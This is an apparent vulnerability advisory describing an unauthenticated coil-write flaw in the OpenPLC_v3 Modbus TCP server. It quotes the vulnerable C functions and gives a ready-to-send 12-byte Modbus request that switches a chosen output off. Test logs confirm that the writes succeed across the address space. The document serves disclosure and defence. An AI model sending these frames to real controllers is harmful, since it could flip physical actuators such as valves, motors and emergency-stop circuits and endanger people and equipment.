# Talos Vulnerability Report

## OpenPLC OpenPLC_v3 ModbusTCP server unrestricted coil write vulnerability

##### CVE Number

[Pending]

##### SUMMARY

An unrestricted write vulnerability exists in the ModbusTCP server functionality of OpenPLC _v3. The `WriteCoil()` function accepts FC=05 (Write Single Coil) requests from any unauthenticated network client without access control on the target Output Address. A specially crafted 12-byte Modbus TCP request can set or clear any coil (addresses 0–8191) that maps to IEC 61131-3 digital output variables (`%QX`) controlling physical actuators. An unauthenticated attacker can send a single network request to trigger this vulnerability.

##### CONFIRMED VULNERABLE VERSIONS

The versions below were either tested or verified to be vulnerable.

OpenPLC _v3 master branch (all versions using `webserver/core/modbus.cpp`)

##### PRODUCT URLS

OpenPLC_v3 - [https://github.com/thiagoralves/OpenPLC_v3](https://github.com/thiagoralves/OpenPLC_v3)

##### CWE

CWE-306 - Missing Authentication for Critical Function

##### DETAILS

OpenPLC is an open-source programmable logic controller (PLC) designed to provide a low cost option for automation. The platform consists of two parts: the Runtime and the Editor. The Runtime can be deployed on a variety of platforms including Windows, Linux, and various microcontrollers. Common uses for OpenPLC include home automation and industrial security research. OpenPLC supports communication across a variety of protocols, including Modbus and EtherNet/IP.

An unrestricted write condition exists in OpenPLC's handling of Modbus Function Code 05 (Write Single Coil). The server accepts FC=05 requests from any network client without authentication or write protection. An attacker can set or clear any coil in the address space, including coils mapped to `%QX` digital output variables that directly control physical ON/OFF actuators such as relays, solenoid valves, motor contactors, and emergency stop circuits.

When a Modbus TCP client connects to port 502, `startServer()` accepts the connection and spawns a handler thread. The handler calls `processMessage()` ([1]), which dispatches to `processModbusMessage()`:

```
void processMessage(unsigned char *buffer, int bufferSize, int client_fd, int protocol_type)
{
    int messageSize = 0;
    if (protocol_type == MODBUS_PROTOCOL)
    {
        messageSize = processModbusMessage(buffer, bufferSize);  // [1]
    }
    while (messageSize > 0)
    {
        ssize_t bytesWritten = write(client_fd, buffer, messageSize);
        // ...
    }
}
```

Inside `processModbusMessage()`, the function code is dispatched with no authentication check ([2]):

```
int processModbusMessage(unsigned char *buffer, int bufferSize)
{
    MessageLength = 0;
    // ...

    else if(buffer[7] == MB_FC_WRITE_COIL)  // FC=05 (0x05)
    {
        WriteCoil(buffer, bufferSize);  // [2] no auth check
    }
    // ...
}
```

The `WriteCoil()` function extracts the Output Address from `buffer[8..9]` ([3]), determines the coil value from `buffer[10..11]` ([4]), and writes directly to the `bool_output[][]` array ([5]):

```
void WriteCoil(unsigned char *buffer, int bufferSize)
{
    int Start;
    int mb_error = ERR_NONE;

    if (bufferSize < 12)
    {
        ModbusError(buffer, ERR_ILLEGAL_DATA_VALUE);
        return;
    }

    Start = word(buffer[8], buffer[9]);  // [3] Output Address — attacker-controlled

    if (Start < MAX_COILS)               // MAX_COILS = 8192, only range check
    {
        unsigned char value;
        if (word(buffer[10], buffer[11]) > 0)  // [4] 0xFF00 = ON, 0x0000 = OFF
            value = 1;
        else
            value = 0;

        pthread_mutex_lock(&bufferLock);
        if (bool_output[Start/8][Start%8] != NULL)
        {
            *bool_output[Start/8][Start%8] = value;   // [5] direct write to physical output
        }
        pthread_mutex_unlock(&bufferLock);
    }
    else
    {
        mb_error = ERR_ILLEGAL_DATA_ADDRESS;
    }

    if (mb_error != ERR_NONE)
    {
        ModbusError(buffer, mb_error);
    }
    else
    {
        buffer[4] = 0;
        buffer[5] = 6;
        MessageLength = 12;  // [6] echo request as confirmation
    }
}
```

The `bool_output[][]` array is declared in `ladder.h` and maps coil addresses to IEC 61131-3 `%QX` digital output variables:

```
extern IEC_BOOL *bool_output[BUFFER_SIZE][8];  // [byte_index][bit_index]
```

The mapping works as follows: coil address `N` maps to `bool_output[N/8][N%8]`, which corresponds to `%QX(N/8).(N%8)`. For example, coil 100 maps to `bool_output[12][4]` = `%QX12.4`. These variables directly control physical ON/OFF outputs — setting a coil to OFF de-energizes the corresponding output on the next PLC scan cycle (~100ms).

At no point in this chain is any authentication, authorization, or write protection check performed. The `WriteMultipleCoils()` function (line 668) shares the identical pattern — `bool_output[position/8][position%8]` is written directly from attacker-controlled data — meaning the entire coil write surface (FC=05 and FC=15) is unprotected.

Knowing this, it is possible to set or clear any coil by sending a single 12-byte request. The following request sets coil `0x0064` (decimal 100) to OFF:

```
00 01 00 00 00 06 01 05 00 64 00 00
```

The server responds with an identical 12-byte echo, confirming the write succeeded with no authentication.

To verify the vulnerability, a test environment was set up with OpenPLC v3 running in a Docker container (debian:trixie) with coils mapped at `%QX0.0`–`%QX0.7`. A Python script sent FC=05 requests and verified results via FC=01 read-back.

**Precision attack** — set coil 0x0064 to OFF while adjacent coils are unchanged:

```
Pre-attack state:
  coil[99]  (0x0063) = ON   ← sentinel
  coil[100] (0x0064) = ON   ← target
  coil[101] (0x0065) = ON   ← sentinel

TX: 00 04 00 00 00 06 01 05 00 64 00 00   ← FC=05, addr=0x0064, value=OFF
RX: 00 04 00 00 00 06 01 05 00 64 00 00   ← echo (write confirmed)

Post-attack state:
  coil[99]  (0x0063) = ON   ← UNCHANGED
  coil[100] (0x0064) = OFF  ← OVERWRITTEN (ON → OFF)
  coil[101] (0x0065) = ON   ← UNCHANGED
```

**Address space sweep** — five addresses tested:

```
Address 0x0000 (dec 0):   written=ON, read-back=ON  ✓
Address 0x0032 (dec 50):  written=ON, read-back=ON  ✓
Address 0x0064 (dec 100): written=ON, read-back=ON  ✓
Address 0x00C8 (dec 200): written=ON, read-back=ON  ✓
Address 0x01F4 (dec 500): written=ON, read-back=ON  ✓
```

All five addresses are writable without authentication, confirming the entire coil address space is unprotected.
